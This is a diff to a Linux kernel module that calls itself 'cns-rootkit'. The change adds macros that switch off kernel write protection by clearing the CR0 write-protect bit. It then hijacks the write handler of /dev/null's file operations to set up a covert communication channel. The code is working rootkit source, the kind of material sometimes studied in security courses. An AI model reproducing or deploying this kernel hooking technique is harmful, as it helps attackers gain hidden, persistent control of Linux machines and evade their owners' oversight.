@@ -3,6 +3,17 @@
 #include <linux/init.h>
 #include <linux/fs.h>
 
+#define DISABLE_W_PROTECTED_MEMORY \
+    do { \
+        preempt_disable(); \
+        write_cr0(read_cr0() & (~ 0x10000)); \
+    } while (0);
+#define ENABLE_W_PROTECTED_MEMORY \
+    do { \
+        preempt_enable(); \
+        write_cr0(read_cr0() | 0x10000); \
+    } while (0);
+
 MODULE_LICENSE("MIT");
 MODULE_AUTHOR("SAV");
 
@@ -28,7 +39,9 @@ int establish_comm_channel(void) {
   filp_close(dev_null_file, 0);
   printk(KERN_INFO "cns-rootkit: Got file_operations structure and closed /dev/null\n");
   original_dev_null_write = dev_null_fop->write;
-
+  DISABLE_W_PROTECTED_MEMORY
+  dev_null_fop->write = cns_rootkit_dev_null_write;
+  ENABLE_W_PROTECTED_MEMORY
   printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
   return 0;
 }
